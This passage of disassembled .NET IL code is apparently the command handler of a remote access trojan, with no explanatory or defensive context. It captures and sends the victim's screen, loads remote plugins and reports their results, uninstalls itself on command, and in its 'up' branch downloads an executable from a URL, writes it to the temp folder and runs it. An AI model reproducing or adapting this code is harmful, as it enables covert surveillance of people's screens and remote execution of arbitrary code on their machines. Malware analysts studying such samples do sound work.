      IL_1307:  newarr     [mscorlib]System.String
      IL_130c:  stloc.s    V_94
      IL_130e:  ldloc.s    V_94
      IL_1310:  ldc.i4.0
      IL_1311:  ldstr      "pl"
      IL_1316:  stelem.ref
      IL_1317:  nop
      IL_1318:  ldloc.s    V_94
      IL_131a:  ldc.i4.1
      IL_131b:  ldsfld     string ClassLibrary1.OK::Y
      IL_1320:  stelem.ref
      IL_1321:  nop
      IL_1322:  ldloc.s    V_94
      IL_1324:  ldc.i4.2
      IL_1325:  ldloc.0
      IL_1326:  ldc.i4.1
      IL_1327:  ldelem.ref
      IL_1328:  stelem.ref
      IL_1329:  nop
      IL_132a:  ldloc.s    V_94
      IL_132c:  ldc.i4.3
      IL_132d:  ldsfld     string ClassLibrary1.OK::Y
      IL_1332:  stelem.ref
      IL_1333:  nop
      IL_1334:  ldloc.s    V_94
      IL_1336:  ldc.i4.4
      IL_1337:  ldstr      "True"
      IL_133c:  stelem.ref
      IL_133d:  nop
      IL_133e:  ldloc.s    V_94
      IL_1340:  call       string [mscorlib]System.String::Concat(string[])
      IL_1345:  call       bool ClassLibrary1.OK::Send(string)
      IL_134a:  pop
      IL_134b:  nop
      IL_134c:  leave      IL_1bd2

      IL_1351:  nop
      IL_1352:  ldc.i4.0
      IL_1353:  stloc.s    V_5
      IL_1355:  ldloc.0
      IL_1356:  ldc.i4.2
      IL_1357:  ldelem.ref
      IL_1358:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
      IL_135d:  ldloca.s   V_5
      IL_135f:  call       uint8[] ClassLibrary1.OK::ZIP(uint8[],
                                                         bool&)
      IL_1364:  stloc.s    V_62
      IL_1366:  ldloc.0
      IL_1367:  ldc.i4.1
      IL_1368:  ldelem.ref
      IL_1369:  ldloc.s    V_62
      IL_136b:  call       string [mscorlib]System.Convert::ToBase64String(uint8[])
      IL_1370:  call       object ClassLibrary1.OK::STV(string,
                                                        string)
      IL_1375:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_137a:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
      IL_137f:  stloc.s    V_110
      IL_1381:  ldloc.s    V_110
      IL_1383:  brfalse.s  IL_13cb

      IL_1385:  ldc.i4.5
      IL_1386:  newarr     [mscorlib]System.String
      IL_138b:  stloc.s    V_94
      IL_138d:  ldloc.s    V_94
      IL_138f:  ldc.i4.0
      IL_1390:  ldstr      "pl"
      IL_1395:  stelem.ref
      IL_1396:  nop
      IL_1397:  ldloc.s    V_94
      IL_1399:  ldc.i4.1
      IL_139a:  ldsfld     string ClassLibrary1.OK::Y
      IL_139f:  stelem.ref
      IL_13a0:  nop
      IL_13a1:  ldloc.s    V_94
      IL_13a3:  ldc.i4.2
      IL_13a4:  ldloc.0
      IL_13a5:  ldc.i4.1
      IL_13a6:  ldelem.ref
      IL_13a7:  stelem.ref
      IL_13a8:  nop
      IL_13a9:  ldloc.s    V_94
      IL_13ab:  ldc.i4.3
      IL_13ac:  ldsfld     string ClassLibrary1.OK::Y
      IL_13b1:  stelem.ref
      IL_13b2:  nop
      IL_13b3:  ldloc.s    V_94
      IL_13b5:  ldc.i4.4
      IL_13b6:  ldc.i4.0
      IL_13b7:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_13bc:  stelem.ref
      IL_13bd:  nop
      IL_13be:  ldloc.s    V_94
      IL_13c0:  call       string [mscorlib]System.String::Concat(string[])
      IL_13c5:  call       bool ClassLibrary1.OK::Send(string)
      IL_13ca:  pop
      IL_13cb:  nop
      IL_13cc:  nop
      IL_13cd:  ldloc.s    V_62
      IL_13cf:  ldstr      "A"
      IL_13d4:  call       object ClassLibrary1.OK::Plugin(uint8[],
                                                           string)
      IL_13d9:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_13de:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_13e3:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_13e8:  stloc.s    V_63
      IL_13ea:  ldc.i4.5
      IL_13eb:  newarr     [mscorlib]System.String
      IL_13f0:  stloc.s    V_94
      IL_13f2:  ldloc.s    V_94
      IL_13f4:  ldc.i4.0
      IL_13f5:  ldstr      "ret"
      IL_13fa:  stelem.ref
      IL_13fb:  nop
      IL_13fc:  ldloc.s    V_94
      IL_13fe:  ldc.i4.1
      IL_13ff:  ldsfld     string ClassLibrary1.OK::Y
      IL_1404:  stelem.ref
      IL_1405:  nop
      IL_1406:  ldloc.s    V_94
      IL_1408:  ldc.i4.2
      IL_1409:  ldloc.0
      IL_140a:  ldc.i4.1
      IL_140b:  ldelem.ref
      IL_140c:  stelem.ref
      IL_140d:  nop
      IL_140e:  ldloc.s    V_94
      IL_1410:  ldc.i4.3
      IL_1411:  ldsfld     string ClassLibrary1.OK::Y
      IL_1416:  stelem.ref
      IL_1417:  nop
      IL_1418:  ldloc.s    V_94
      IL_141a:  ldc.i4.4
      IL_141b:  ldloc.s    V_63
      IL_141d:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1422:  ldnull
      IL_1423:  ldstr      "GT"
      IL_1428:  ldc.i4.0
      IL_1429:  newarr     [mscorlib]System.Object
      IL_142e:  ldnull
      IL_142f:  ldnull
      IL_1430:  ldnull
      IL_1431:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_1436:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_143b:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_1440:  stloc.s    V_93
      IL_1442:  ldloca.s   V_93
      IL_1444:  call       string ClassLibrary1.OK::ENB(string&)
      IL_1449:  stelem.ref
      IL_144a:  nop
      IL_144b:  ldloc.s    V_94
      IL_144d:  call       string [mscorlib]System.String::Concat(string[])
      IL_1452:  call       bool ClassLibrary1.OK::Send(string)
      IL_1457:  pop
      IL_1458:  nop
      IL_1459:  leave      IL_1bd2

      IL_145e:  nop
      IL_145f:  ldloc.s    V_9
      IL_1461:  ldstr      "CAP"
      IL_1466:  ldc.i4.0
      IL_1467:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_146c:  ldc.i4.0
      IL_146d:  ceq
      IL_146f:  stloc.s    V_110
      IL_1471:  ldloc.s    V_110
      IL_1473:  brfalse    IL_1609

      IL_1478:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_147d:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_1482:  stloc.s    V_66
      IL_1484:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_1489:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_148e:  stloc.s    V_102
      IL_1490:  ldloca.s   V_102
      IL_1492:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_1497:  ldloca.s   V_66
      IL_1499:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_149e:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                      int32)
      IL_14a3:  stloc.s    V_68
      IL_14a5:  ldloc.s    V_68
      IL_14a7:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromImage(class [System.Drawing]System.Drawing.Image)
      IL_14ac:  stloc.s    V_67
      IL_14ae:  ldloca.s   V_65
      IL_14b0:  ldloc.s    V_68
      IL_14b2:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Width()
      IL_14b7:  ldloc.s    V_68
      IL_14b9:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
      IL_14be:  call       instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                    int32)
      IL_14c3:  nop
      IL_14c4:  ldloc.s    V_67
      IL_14c6:  ldc.i4.0
      IL_14c7:  ldc.i4.0
      IL_14c8:  ldc.i4.0
      IL_14c9:  ldc.i4.0
      IL_14ca:  ldloc.s    V_65
      IL_14cc:  ldc.i4     0xcc0020
      IL_14d1:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::CopyFromScreen(int32,
                                                                                                 int32,
                                                                                                 int32,
                                                                                                 int32,
                                                                                                 valuetype [System.Drawing]System.Drawing.Size,
                                                                                                 valuetype [System.Drawing]System.Drawing.CopyPixelOperation)
      IL_14d6:  nop
      IL_14d7:  nop
      .try
      {
        IL_14d8:  ldloca.s   V_65
        IL_14da:  ldc.i4.s   32
        IL_14dc:  ldc.i4.s   32
        IL_14de:  call       instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                      int32)
        IL_14e3:  nop
        IL_14e4:  ldloca.s   V_66
        IL_14e6:  call       valuetype [System.Drawing]System.Drawing.Point [System.Windows.Forms]System.Windows.Forms.Cursor::get_Position()
        IL_14eb:  ldloc.s    V_65
        IL_14ed:  call       instance void [System.Drawing]System.Drawing.Rectangle::.ctor(valuetype [System.Drawing]System.Drawing.Point,
                                                                                           valuetype [System.Drawing]System.Drawing.Size)
        IL_14f2:  nop
        IL_14f3:  call       class [System.Windows.Forms]System.Windows.Forms.Cursor [System.Windows.Forms]System.Windows.Forms.Cursors::get_Default()
        IL_14f8:  ldloc.s    V_67
        IL_14fa:  ldloc.s    V_66
        IL_14fc:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Cursor::Draw(class [System.Drawing]System.Drawing.Graphics,
                                                                                                   valuetype [System.Drawing]System.Drawing.Rectangle)
        IL_1501:  nop
        IL_1502:  leave.s    IL_1526

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_1504:  dup
        IL_1505:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_150a:  stloc.s    V_74
        IL_150c:  nop
        IL_150d:  ldloc.s    V_74
        IL_150f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1514:  nop
        IL_1515:  ldloc.s    V_74
        IL_1517:  stloc.s    V_73
        IL_1519:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_151e:  nop
        IL_151f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1524:  leave.s    IL_1526

      }  // end handler
      IL_1526:  nop
      IL_1527:  ldloc.s    V_67
      IL_1529:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_152e:  nop
      IL_152f:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_1534:  stloc.s    V_71
      IL_1536:  ldstr      "CAP"
      IL_153b:  ldsfld     string ClassLibrary1.OK::Y
      IL_1540:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_1545:  stloc.s    V_93
      IL_1547:  ldloca.s   V_93
      IL_1549:  call       uint8[] ClassLibrary1.OK::SB(string&)
      IL_154e:  starg.s    b
      IL_1550:  ldloc.s    V_71
      IL_1552:  ldarg.0
      IL_1553:  ldc.i4.0
      IL_1554:  ldarg.0
      IL_1555:  ldlen
      IL_1556:  conv.ovf.i4
      IL_1557:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_155c:  nop
      IL_155d:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_1562:  stloc.s    V_72
      IL_1564:  ldloc.s    V_68
      IL_1566:  ldloc.0
      IL_1567:  ldc.i4.1
      IL_1568:  ldelem.ref
      IL_1569:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_156e:  ldloc.0
      IL_156f:  ldc.i4.2
      IL_1570:  ldelem.ref
      IL_1571:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_1576:  ldnull
      IL_1577:  ldloc.s    V_69
      IL_1579:  callvirt   instance class [System.Drawing]System.Drawing.Image [System.Drawing]System.Drawing.Image::GetThumbnailImage(int32,
                                                                                                                                       int32,
                                                                                                                                       class [System.Drawing]System.Drawing.Image/GetThumbnailImageAbort,
                                                                                                                                       native int)
      IL_157e:  ldloc.s    V_72
      IL_1580:  call       class [System.Drawing]System.Drawing.Imaging.ImageFormat [System.Drawing]System.Drawing.Imaging.ImageFormat::get_Jpeg()
      IL_1585:  callvirt   instance void [System.Drawing]System.Drawing.Image::Save(class [mscorlib]System.IO.Stream,
                                                                                    class [System.Drawing]System.Drawing.Imaging.ImageFormat)
      IL_158a:  nop
      IL_158b:  ldloc.s    V_72
      IL_158d:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_1592:  call       string ClassLibrary1.OK::getMD5Hash(uint8[])
      IL_1597:  stloc.s    V_70
      IL_1599:  ldloc.s    V_70
      IL_159b:  ldsfld     string ClassLibrary1.OK::lastcap
      IL_15a0:  ldc.i4.0
      IL_15a1:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_15a6:  ldc.i4.0
      IL_15a7:  ceq
      IL_15a9:  ldc.i4.0
      IL_15aa:  ceq
      IL_15ac:  stloc.s    V_110
      IL_15ae:  ldloc.s    V_110
      IL_15b0:  brfalse.s  IL_15d3

      IL_15b2:  ldloc.s    V_70
      IL_15b4:  stsfld     string ClassLibrary1.OK::lastcap
      IL_15b9:  ldloc.s    V_71
      IL_15bb:  ldloc.s    V_72
      IL_15bd:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_15c2:  ldc.i4.0
      IL_15c3:  ldloc.s    V_72
      IL_15c5:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_15ca:  conv.ovf.i4
      IL_15cb:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_15d0:  nop
      IL_15d1:  br.s       IL_15dd

      IL_15d3:  nop
      IL_15d4:  ldloc.s    V_71
      IL_15d6:  ldc.i4.0
      IL_15d7:  callvirt   instance void [mscorlib]System.IO.MemoryStream::WriteByte(uint8)
      IL_15dc:  nop
      IL_15dd:  nop
      IL_15de:  ldloc.s    V_71
      IL_15e0:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_15e5:  call       bool ClassLibrary1.OK::Sendb(uint8[])
      IL_15ea:  pop
      IL_15eb:  ldloc.s    V_71
      IL_15ed:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_15f2:  nop
      IL_15f3:  ldloc.s    V_72
      IL_15f5:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_15fa:  nop
      IL_15fb:  ldloc.s    V_68
      IL_15fd:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
      IL_1602:  nop
      IL_1603:  nop
      IL_1604:  leave      IL_1bd2

      IL_1609:  nop
      IL_160a:  ldloc.s    V_9
      IL_160c:  ldstr      "P"
      IL_1611:  ldc.i4.0
      IL_1612:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1617:  ldc.i4.0
      IL_1618:  ceq
      IL_161a:  stloc.s    V_110
      IL_161c:  ldloc.s    V_110
      IL_161e:  brfalse.s  IL_1631

      IL_1620:  ldstr      "P"
      IL_1625:  call       bool ClassLibrary1.OK::Send(string)
      IL_162a:  pop
      IL_162b:  nop
      IL_162c:  leave      IL_1bd2

      IL_1631:  nop
      IL_1632:  ldloc.s    V_9
      IL_1634:  ldstr      "un"
      IL_1639:  ldc.i4.0
      IL_163a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_163f:  ldc.i4.0
      IL_1640:  ceq
      IL_1642:  stloc.s    V_110
      IL_1644:  ldloc.s    V_110
      IL_1646:  brfalse    IL_16dd

      IL_164b:  nop
      IL_164c:  ldloc.0
      IL_164d:  ldc.i4.1
      IL_164e:  ldelem.ref
      IL_164f:  stloc.s    V_103
      IL_1651:  nop
      IL_1652:  ldloc.s    V_103
      IL_1654:  ldstr      "~"
      IL_1659:  ldc.i4.0
      IL_165a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_165f:  ldc.i4.0
      IL_1660:  ceq
      IL_1662:  stloc.s    V_109
      IL_1664:  ldloc.s    V_109
      IL_1666:  brfalse.s  IL_1674

      IL_1668:  nop
      IL_1669:  call       void ClassLibrary1.OK::UNS()
      IL_166e:  nop
      IL_166f:  nop
      IL_1670:  br.s       IL_16d6

      IL_1672:  br.s       IL_16d6

      IL_1674:  nop
      IL_1675:  ldloc.s    V_103
      IL_1677:  ldstr      "!"
      IL_167c:  ldc.i4.0
      IL_167d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1682:  ldc.i4.0
      IL_1683:  ceq
      IL_1685:  stloc.s    V_110
      IL_1687:  ldloc.s    V_110
      IL_1689:  brfalse.s  IL_169e

      IL_168b:  nop
      IL_168c:  ldc.i4.0
      IL_168d:  call       void ClassLibrary1.OK::pr(int32)
      IL_1692:  nop
      IL_1693:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_1698:  nop
      IL_1699:  nop
      IL_169a:  br.s       IL_16d6

      IL_169c:  br.s       IL_16d6

      IL_169e:  nop
      IL_169f:  ldloc.s    V_103
      IL_16a1:  ldstr      "@"
      IL_16a6:  ldc.i4.0
      IL_16a7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_16ac:  ldc.i4.0
      IL_16ad:  ceq
      IL_16af:  stloc.s    V_110
      IL_16b1:  ldloc.s    V_110
      IL_16b3:  brfalse.s  IL_16d6

      IL_16b5:  nop
      IL_16b6:  ldc.i4.0
      IL_16b7:  call       void ClassLibrary1.OK::pr(int32)
      IL_16bc:  nop
      IL_16bd:  ldsfld     class [mscorlib]System.IO.FileInfo ClassLibrary1.OK::LO
      IL_16c2:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_16c7:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_16cc:  pop
      IL_16cd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_16d2:  nop
      IL_16d3:  nop
      IL_16d4:  br.s       IL_16d6

      IL_16d6:  nop
      IL_16d7:  nop
      IL_16d8:  leave      IL_1bd2

      IL_16dd:  nop
      IL_16de:  ldloc.s    V_9
      IL_16e0:  ldstr      "up"
      IL_16e5:  ldc.i4.0
      IL_16e6:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_16eb:  ldc.i4.0
      IL_16ec:  ceq
      IL_16ee:  ldc.i4.0
      IL_16ef:  ceq
      IL_16f1:  stloc.s    V_110
      IL_16f3:  ldloc.s    V_110
      IL_16f5:  brfalse.s  IL_16fc

      IL_16f7:  br         IL_18f6

      IL_16fc:  nop
      IL_16fd:  ldnull
      IL_16fe:  stloc.1
      IL_16ff:  ldloc.0
      IL_1700:  ldc.i4.1
      IL_1701:  ldelem.ref
      IL_1702:  callvirt   instance string [mscorlib]System.String::ToLower()
      IL_1707:  ldstr      "http"
      IL_170c:  callvirt   instance bool [mscorlib]System.String::StartsWith(string)
      IL_1711:  ldc.i4.0
      IL_1712:  ceq
      IL_1714:  stloc.s    V_110
      IL_1716:  ldloc.s    V_110
      IL_1718:  brfalse.s  IL_1789

      IL_171a:  nop
      .try
      {
        IL_171b:  ldc.i4.0
        IL_171c:  stloc.s    V_5
        IL_171e:  ldloc.0
        IL_171f:  ldc.i4.1
        IL_1720:  ldelem.ref
        IL_1721:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
        IL_1726:  ldloca.s   V_5
        IL_1728:  call       uint8[] ClassLibrary1.OK::ZIP(uint8[],
                                                           bool&)
        IL_172d:  stloc.1
        IL_172e:  nop
        IL_172f:  leave      IL_17f3

        IL_1734:  leave.s    IL_1788

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_1736:  dup
        IL_1737:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_173c:  stloc.s    V_76
        IL_173e:  nop
        IL_173f:  ldloc.s    V_76
        IL_1741:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1746:  nop
        IL_1747:  ldloc.s    V_76
        IL_1749:  stloc.s    V_75
        IL_174b:  ldstr      "MSG"
        IL_1750:  ldsfld     string ClassLibrary1.OK::Y
        IL_1755:  ldstr      "Update ERROR"
        IL_175a:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_175f:  call       bool ClassLibrary1.OK::Send(string)
        IL_1764:  pop
        IL_1765:  ldstr      "bla"
        IL_176a:  call       bool ClassLibrary1.OK::Send(string)
        IL_176f:  pop
        IL_1770:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1775:  nop
        IL_1776:  nop
        IL_1777:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_177c:  leave      IL_1bd2

        IL_1781:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1786:  leave.s    IL_1788

      }  // end handler
      IL_1788:  nop
      IL_1789:  nop
      IL_178a:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_178f:  stloc.s    V_4
      IL_1791:  nop
      .try
      {
        IL_1792:  ldloc.s    V_4
        IL_1794:  ldloc.0
        IL_1795:  ldc.i4.1
        IL_1796:  ldelem.ref
        IL_1797:  callvirt   instance uint8[] [System]System.Net.WebClient::DownloadData(string)
        IL_179c:  stloc.1
        IL_179d:  leave.s    IL_17f1

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_179f:  dup
        IL_17a0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_17a5:  stloc.s    V_78
        IL_17a7:  nop
        IL_17a8:  ldloc.s    V_78
        IL_17aa:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_17af:  nop
        IL_17b0:  ldloc.s    V_78
        IL_17b2:  stloc.s    V_77
        IL_17b4:  ldstr      "MSG"
        IL_17b9:  ldsfld     string ClassLibrary1.OK::Y
        IL_17be:  ldstr      "Update ERROR"
        IL_17c3:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_17c8:  call       bool ClassLibrary1.OK::Send(string)
        IL_17cd:  pop
        IL_17ce:  ldstr      "bla"
        IL_17d3:  call       bool ClassLibrary1.OK::Send(string)
        IL_17d8:  pop
        IL_17d9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_17de:  nop
        IL_17df:  nop
        IL_17e0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_17e5:  leave      IL_1bd2

        IL_17ea:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_17ef:  leave.s    IL_17f1

      }  // end handler
      IL_17f1:  nop
      IL_17f2:  nop
      IL_17f3:  nop
      IL_17f4:  ldstr      "bla"
      IL_17f9:  call       bool ClassLibrary1.OK::Send(string)
      IL_17fe:  pop
      IL_17ff:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
      IL_1804:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_1809:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_180e:  ldstr      "di"
      IL_1813:  ldstr      ""
      IL_1818:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_181d:  nop
      IL_181e:  ldstr      "temp"
      IL_1823:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_1828:  ldstr      "\\"
      IL_182d:  ldc.i4.s   10
      IL_182f:  call       string ClassLibrary1.OK::RN(int32)
      IL_1834:  ldstr      ".exe"
      IL_1839:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_183e:  stloc.s    V_8
      IL_1840:  ldloc.s    V_8
      IL_1842:  ldloc.1
      IL_1843:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                        uint8[])
      IL_1848:  nop
      IL_1849:  ldstr      "MSG"
      IL_184e:  ldsfld     string ClassLibrary1.OK::Y
      IL_1853:  ldstr      "Updating To "
      IL_1858:  ldloc.s    V_8
      IL_185a:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
      IL_185f:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
      IL_1864:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_1869:  call       bool ClassLibrary1.OK::Send(string)
      IL_186e:  pop
      IL_186f:  ldloc.s    V_8
      IL_1871:  ldstr      "UP:"
      IL_1876:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_187b:  callvirt   instance int32 [System]System.Diagnostics.Process::get_Id()
      IL_1880:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_1885:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_188a:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string,
                                                                                                              string)
      IL_188f:  pop
      IL_1890:  ldc.i4.0
      IL_1891:  stloc.s    V_6
      IL_1893:  nop
      IL_1894:  ldc.i4.s   10
      IL_1896:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_189b:  nop
      IL_189c:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
      IL_18a1:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_18a6:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_18ab:  ldstr      "di"
      IL_18b0:  ldstr      ""
      IL_18b5:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                           object)
      IL_18ba:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_18bf:  ldstr      "!"
      IL_18c4:  ldc.i4.0
      IL_18c5:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                       object,
                                                                                                                                       bool)
      IL_18ca:  stloc.s    V_110
      IL_18cc:  ldloc.s    V_110
      IL_18ce:  brfalse.s  IL_18d6

      IL_18d0:  call       void ClassLibrary1.OK::UNS()
      IL_18d5:  nop
      IL_18d6:  nop
      IL_18d7:  ldloc.s    V_6
      IL_18d9:  ldc.i4.1
      IL_18da:  add.ovf
      IL_18db:  stloc.s    V_6
      IL_18dd:  ldloc.s    V_6
      IL_18df:  ldc.i4     0x1f4
      IL_18e4:  cgt
      IL_18e6:  ldc.i4.0
      IL_18e7:  ceq
      IL_18e9:  stloc.s    V_110
      IL_18eb:  ldloc.s    V_110
      IL_18ed:  brtrue.s   IL_1894

      IL_18ef:  nop
      IL_18f0:  leave      IL_1bd2

      IL_18f5:  nop
      IL_18f6:  nop
      IL_18f7:  ldloc.s    V_9
      IL_18f9:  ldstr      "RG"
      IL_18fe:  ldc.i4.0
